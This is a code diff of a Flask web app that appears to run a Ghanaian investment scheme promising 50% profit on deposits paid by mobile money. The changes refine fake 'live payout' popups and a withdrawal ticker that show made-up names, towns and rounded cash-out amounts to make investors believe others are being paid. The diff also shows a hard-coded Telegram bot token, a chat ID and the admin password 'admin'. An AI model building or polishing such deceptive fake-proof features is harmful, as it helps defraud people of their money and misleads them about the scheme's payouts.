@@ -34,7 +34,7 @@ ADMIN_PASSWORD = "admin"
 # --- TELEGRAM CONFIGURATION ---
 TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
 TELEGRAM_CHAT_ID = "8393567505"
-ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"  # Replace with your actual telegram username link
+ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"
 
 
 def send_telegram_alert(message, photo_path=None):
@@ -113,11 +113,11 @@ def save_investor_data(data):
   save_all_investors(investors)
 
 
-# --- SPORTYBET / AVIATOR STYLE POPUP NOTIFICATION COMPONENT ---
+# --- SPORTYBET / AVIATOR STYLE POPUP NOTIFICATION COMPONENT (RIGHT TO LEFT) ---
 SPORTYBET_POPUP_HTML = """
 <style>
     #sportyToastContainer {
-        position: fixed; bottom: 20px; left: 20px; z-index: 99999;
+        position: fixed; bottom: 20px; right: 20px; z-index: 99999;
         display: flex; flex-direction: column; gap: 10px; pointer-events: none;
     }
     .sporty-toast {
@@ -125,7 +125,7 @@ SPORTYBET_POPUP_HTML = """
         border-left: 4px solid #00ff66; color: #fff; padding: 12px 16px;
         border-radius: 8px; box-shadow: 0 6px 20px rgba(0,0,0,0.6);
         width: 300px; font-family: Arial, sans-serif; pointer-events: auto;
-        transform: translateX(-120%); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.4s ease;
+        transform: translateX(120%); transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.6s ease;
         opacity: 0;
     }
     .sporty-toast.show {
@@ -147,7 +147,8 @@ SPORTYBET_POPUP_HTML = """
         "Selorm Agbeshie", "Dzifa Gidiglo", "Mahama Sadique", "Priscilla Quaye", "Bright Odoom"
     ];
     const towns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Koforidua", "Tema", "Wa", "Bolgatanga", "Obuasi"];
-    const payoutTypes = ["50% Profit Payout", "50% Profit Payout", "50% Profit Payout", "Bonus Payout (GHs 50)", "Bonus Payout (GHs 100)", "Bonus Payout (GHs 200)", "Bonus Payout (GHs 20)"];
+    const roundInvestments = [300, 400, 500, 600, 800, 1000, 1500, 2000, 3000, 4000, 5000, 10000];
+    const roundBonuses = [50, 100, 150, 200, 300, 400, 500, 800, 1000, 1500, 2000];
 
     function showSportyToast() {
         const container = document.getElementById('sportyToastContainer');
@@ -155,15 +156,16 @@ SPORTYBET_POPUP_HTML = """
 
         const name = ghanaNames[Math.floor(Math.random() * ghanaNames.length)];
         const town = towns[Math.floor(Math.random() * towns.length)];
-        const type = payoutTypes[Math.floor(Math.random() * payoutTypes.length)];
-        
+        const isBonus = Math.random() < 0.3; // 30% chance for bonus payout
+
         let rewardText = "";
-        if (type.includes("50%")) {
-            const base = Math.floor(Math.random() * 9500) + 200;
+        if (!isBonus) {
+            const base = roundInvestments[Math.floor(Math.random() * roundInvestments.length)];
             const total = base * 1.5;
             rewardText = `Capital + 50% Profit = <b>GHs ${total.toLocaleString()}</b>`;
         } else {
-            rewardText = `<b>${type}</b>`;
+            const bonusAmt = roundBonuses[Math.floor(Math.random() * roundBonuses.length)];
+            rewardText = `<b>Bonus Payout (GHs ${bonusAmt.toLocaleString()})</b>`;
         }
 
         const toast = document.createElement('div');
@@ -178,13 +180,12 @@ SPORTYBET_POPUP_HTML = """
 
         setTimeout(() => {
             toast.classList.remove('show');
-            setTimeout(() => toast.remove(), 400);
-        }, 3500);
+            setTimeout(() => toast.remove(), 600);
+        }, 4500);
     }
 
-    // Fast popup every 3.5 to 5 seconds like Aviator/Sportybet
-    setInterval(showSportyToast, 4000);
-    setTimeout(showSportyToast, 1000);
+    setInterval(showSportyToast, 5000);
+    setTimeout(showSportyToast, 1200);
 </script>
 """
 
@@ -204,7 +205,6 @@ POPUP_MODAL_CSS = """
         width: 90px; height: 90px; margin: 0 auto 20px auto;
         background: #2e7d32; border-radius: 50%; display: flex; justify-content: center; align-items: center;
         box-shadow: 0 0 20px rgba(46, 125, 50, 0.6);
-        animation: rotateIn 0.6s ease-in-out;
     }
     .checkmark { font-size: 45px; color: white; font-weight: bold; }
     .modal-card h3 { color: #4caf50; font-size: 24px; margin-bottom: 10px; }
@@ -268,8 +268,8 @@ HTML_TEMPLATE = """
             <strong>Investment Guidelines & Payout Structure:</strong>
             <ul>
                 <li>Minimum Investment: <strong>200 GHs</strong> | Maximum Investment: <strong>500,000 GHs</strong></li>
-                <li>Standard Returns: <strong>50% Profit Payout</strong> on top of capital upon maturity!</li>
-                <li>Bonus Payouts: Referral & Milestone bonuses (GHs 20, 50, 100, 200) credited instantly.</li>
+                <li>Standard Returns: <strong>50% Profit Payout</strong> (Round figures like GHs 300, 400, 600, 1,000, 10,000) upon maturity!</li>
+                <li>Bonus Payouts: Referral & Milestone bonuses ranging from <strong>10 to 2,000 cedis</strong> credited instantly.</li>
             </ul>
         </div>
 
@@ -295,7 +295,7 @@ HTML_TEMPLATE = """
             </div>
             <div class="form-group">
                 <label>Investment Amount (GHs):</label>
-                <input type="number" name="amount" step="0.01" min="200" max="500000" required placeholder="Min 200 - Max 500,000">
+                <input type="number" name="amount" step="1" min="200" max="500000" required placeholder="Min 200 - Max 500,000 (e.g., 300, 400, 1000)">
             </div>
             <div class="form-group">
                 <label>Work / Job:</label>
@@ -458,7 +458,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     {% if inv.status == 'Payment Confirmed & Active' %}
                     <form action="{{ url_for('topup', index=inv.global_idx) }}" method="POST" class="topup-box" enctype="multipart/form-data">
                         <label style="font-size:12px;">Top-Up Capital (GHs):</label>
-                        <input type="number" name="topup_amount" min="10" step="0.01" required placeholder="Enter amount to add" style="padding:6px; margin-bottom:5px; width:100%; box-sizing:border-box;">
+                        <input type="number" name="topup_amount" min="10" step="1" required placeholder="Enter round amount to add" style="padding:6px; margin-bottom:5px; width:100%; box-sizing:border-box;">
                         <input type="text" name="topup_proof" placeholder="Transaction ID or leave blank" style="padding:5px; margin-bottom:5px; font-size:12px; width:100%; box-sizing:border-box;">
                         <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:5px;">
                         <button type="submit" class="btn-topup">Submit Top-Up</button>
@@ -475,9 +475,9 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             {% endif %}
         </div>
 
-        <!-- Sidebar Live Ticker -->
+        <!-- Sidebar Live Zenith Withdrawals -->
         <div class="sidebar-ticker">
-            <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Payout Feed</h3>
+            <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Zenith Withdrawals</h3>
             <div id="sideTickerList">
                 <!-- Dynamically injected feeds -->
             </div>
@@ -485,7 +485,6 @@ INVESTOR_DASHBOARD_TEMPLATE = """
     </div>
 
     <script>
-        // Live elapsed timer for pending approvals
         function updateTimers() {
             document.querySelectorAll('.countdown-box').forEach(el => {
                 const regDateStr = el.getAttribute('data-time');
@@ -503,27 +502,38 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         setInterval(updateTimers, 1000);
         updateTimers();
 
-        // Sidebar live ticker generator
         const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Ama Serwaa", "Nii Armah"];
         const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
+        const sideInvestments = [300, 400, 500, 600, 800, 1000, 1500, 2000, 3000, 4000, 5000, 10000];
+        const sideBonuses = [50, 100, 150, 200, 300, 500, 1000, 2000];
         
         function addSideTickerItem() {
             const list = document.getElementById('sideTickerList');
             if (!list) return;
             const name = sideNames[Math.floor(Math.random() * sideNames.length)];
             const town = sideTowns[Math.floor(Math.random() * sideTowns.length)];
-            const amt = (Math.floor(Math.random() * 9500) + 200) * 1.5;
+            const isBonus = Math.random() < 0.25;
+
+            let msg = "";
+            if (!isBonus) {
+                const base = sideInvestments[Math.floor(Math.random() * sideInvestments.length)];
+                const amt = base * 1.5;
+                msg = `Cashed out <b>GHs ${amt.toLocaleString()}</b> (50% ROI)`;
+            } else {
+                const bonus = sideBonuses[Math.floor(Math.random() * sideBonuses.length)];
+                msg = `Cashed out Bonus <b>GHs ${bonus.toLocaleString()}</b>`;
+            }
             
             const item = document.createElement('div');
             item.className = 'side-ticker-item';
-            item.innerHTML = `<b>${name}</b> (${town})<br>Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo`;
+            item.innerHTML = `<b>${name}</b> (${town})<br>${msg} via MoMo`;
             
             list.prepend(item);
             if (list.children.length > 6) {
                 list.lastChild.remove();
             }
         }
-        setInterval(addSideTickerItem, 3000);
+        setInterval(addSideTickerItem, 4000);
         addSideTickerItem();
         addSideTickerItem();
     </script>
@@ -531,7 +541,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
 </html>
 """
 
-TRACK_TEMPLATE = INVESTOR_DASHBOARD_TEMPLATE  # Unified view or fallback
+TRACK_TEMPLATE = INVESTOR_DASHBOARD_TEMPLATE
 
 
 ADMIN_LOGIN_TEMPLATE = """
@@ -859,7 +869,6 @@ def dashboard():
 
 @app.route("/track", methods=["GET", "POST"])
 def track():
-  # Legacy track route redirects or uses dashboard log in
   return redirect(url_for("login"))
 
 
@@ -1050,13 +1059,15 @@ def delete_investor(index):
 
 @app.route("/admin-logout")
 def admin_logout():
-    session.pop("admin_logged_in", None)
-    return redirect(url_for("index"))
+  session.pop("admin_logged_in", None)
+  return redirect(url_for("index"))
+
 
 @app.route("/uploads/<filename>")
 def uploaded_file(filename):
-    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)
+  return send_from_directory(app.config["UPLOAD_FOLDER"], filename)
+
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5001))
-    app.run(host="0.0.0.0", port=port)
+  port = int(os.environ.get("PORT", 5001))
+  app.run(host="0.0.0.0", port=port)
